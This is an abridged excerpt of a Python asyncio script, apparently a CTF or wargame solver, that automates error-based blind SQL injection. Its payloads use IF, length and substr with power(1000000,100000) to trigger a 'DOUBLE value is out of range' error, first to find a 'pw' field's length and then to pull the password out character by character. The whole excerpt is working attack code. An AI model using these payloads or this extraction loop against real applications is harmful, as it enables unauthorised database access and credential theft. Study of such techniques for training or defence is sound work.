...
async def find_password_length(session):
    for length in range(1, 50):  # Adjust the range based on expected max length
        payload = f"'|| IF(length(pw)={length},power(1000000,100000),0)--\t"

        response = await fetch(session, payload)
        if "DOUBLE value is out of range" in response:
    ...
    async with aiohttp.ClientSession() as session:
        ...
        while len(password) < password_length:
            ...
            for c in character_set:  # Iterate through character set
                ...
                payload = f"'||IF(substr(pw,{i},1)='{c}',power(1000000,100000),0)--\t"
            ...
            for index, response in enumerate(responses):
                if index < len(character_set) and "DOUBLE value is out of range" in response:
